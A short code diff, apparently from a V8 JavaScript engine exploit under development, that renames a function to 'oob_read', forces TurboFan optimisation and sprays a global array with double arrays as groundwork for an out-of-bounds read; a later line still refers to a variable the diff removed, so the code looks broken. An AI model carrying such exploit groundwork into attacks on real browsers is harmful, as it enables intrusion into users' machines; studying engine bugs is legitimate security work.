@@ -1,4 +1,6 @@
-function maxstring() {
+var arr_global = new Array(0x100);
+
+function oob_read() {
     // force TurboFan
     try {} finally {}
   
@@ -9,8 +11,10 @@ function maxstring() {
     if (i > 3) {
       return 0;
     } else {
-      var arr = [{},{},{}];
-      var temp= [0.1,0.2,0.3,0.4];
+      var oob_initial = [{},{},{}];
+      for(let i = 0; i < 100; i++){
+        arr_global[i] = [0.1,0.2,0.3,0.4]; //write a lot double array into arr_global.
+      }
       //let arr3= new Array(1.1,2.2,3.3,4.4);
       
       print(arr.length);
